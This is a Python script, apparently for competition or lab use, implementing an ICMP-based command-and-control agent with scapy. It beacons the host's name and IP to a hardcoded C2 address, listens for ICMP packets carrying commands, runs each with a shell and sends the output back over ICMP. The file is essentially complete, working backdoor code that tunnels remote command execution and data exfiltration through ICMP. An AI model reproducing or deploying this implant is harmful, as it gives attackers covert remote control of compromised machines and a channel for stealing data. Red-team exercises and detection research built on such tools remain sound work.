#!/usr/bin/env python3
"""
Author: Miller Swank
Date: 2025-09-24 (Updated)
Description: ICMP client agent for educational cybersecurity competitions and testing.
             Beacons to the server, executes queued commands, and returns results.
Note: For competition/lab purposes only. Do not run in production environments.
"""

from scapy.all import *
import threading
import time
import os
import subprocess
import random
import string
import socket
import signal
import sys

# ====== CONFIGURATION ======
C2_IP = "10.64.182.14"   # C2 server IP
BEACON_INTERVAL = 120       # seconds between beacons (short for testing)
AGENT_ID = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
SEQ = 0

# ====== GLOBALS ======
lock = threading.Lock()
running = True
HOSTNAME = socket.gethostname()

# ====== HELPER: determine outbound IP ======
def get_outbound_ip(dest_ip="8.8.8.8", dest_port=53):
    """
    Return the local outbound IP used to reach dest_ip (does not send packets).
    Returns None on failure.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((dest_ip, dest_port))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return None

# ====== CORE FUNCTIONS ======

def send_packet(msg_type, seq, data=""):
    """Send an ICMP packet with formatted payload, safely."""
    payload = f"{AGENT_ID}|{msg_type}|{seq}|{data}"
    try:
        send(IP(dst=C2_IP)/ICMP(type=8)/payload, verbose=0)
        print(f"[+] Sent {msg_type} packet to {C2_IP}")
    except Exception as e:
        print(f"[!] Failed to send {msg_type} packet: {e}")

def send_beacon():
    """Send a periodic beacon announcing this agent (hostname and outbound IP)."""
    local_ip = get_outbound_ip(C2_IP) or ""
    # payload: hostname,ip  -> server will parse hostname and reported IP
    beacon_data = f"{HOSTNAME},{local_ip}"
    send_packet("BEACON", 0, beacon_data)

def send_result(seq, result_text):
    """Send command execution results to the C2 server."""
    send_packet("RESULT", seq, result_text)

def execute_command(command):
    """Execute a shell command and return its output."""
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode("utf-8", errors="ignore")
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output.decode('utf-8', errors='ignore')}"
    except Exception as e:
        return f"Error: {str(e)}"

def handle_reply(pkt):
    """Handle incoming ICMP packets from the C2 server."""
    global SEQ
    if not pkt.haslayer(ICMP) or not pkt.haslayer(Raw):
        return

    try:
        payload = pkt[Raw].load.decode(errors="ignore")
        fields = payload.split("|", 3)
        if len(fields) < 4:
            return

        agent_id, msg_type, seq_str, data = fields
        if agent_id != AGENT_ID:
            return  # Not for this client

        msg_type = msg_type.strip()
        data = data.strip()

        if msg_type == "CMD":
            print(f"[+] Received command: {data}")
            result = execute_command(data)
            with lock:
                send_result(SEQ, result)
                SEQ += 1
    except Exception as e:
        print(f"[!] Error handling reply: {e}")

def start_sniffer():
    """Background sniffer for ICMP replies."""
    while running:
        try:
            sniff(filter="icmp", prn=handle_reply, store=0, timeout=5)
        except Exception as e:
            print(f"[!] Sniffer error: {e}")
            time.sleep(1)

def beacon_loop():
    """Main beacon loop."""
    while running:
        try:
            send_beacon()
        except Exception as e:
            print(f"[!] Beacon error: {e}")
        time.sleep(BEACON_INTERVAL)

def graceful_exit(signum=None, frame=None):
    """Send EXIT message to server before shutting down."""
    global running
    running = False
    print(f"\n[*] Shutting down agent {AGENT_ID} ({HOSTNAME})...")
    try:
        send_packet("EXIT", 0, HOSTNAME)
    except Exception:
        pass
    sys.exit(0)

# ====== ENTRY POINT ======
if __name__ == "__main__":
    print(f"[*] Starting agent {AGENT_ID} ({HOSTNAME}) targeting C2 {C2_IP}")

    # Ensure we are root
    if os.geteuid() != 0:
        print("[!] Error: Root privileges required to send ICMP packets")
        sys.exit(1)

    # Handle Ctrl+C or kill signals gracefully
    signal.signal(signal.SIGINT, graceful_exit)
    signal.signal(signal.SIGTERM, graceful_exit)

    # Start threads
    threading.Thread(target=start_sniffer, daemon=True).start()
    try:
        beacon_loop()
    except KeyboardInterrupt:
        graceful_exit()
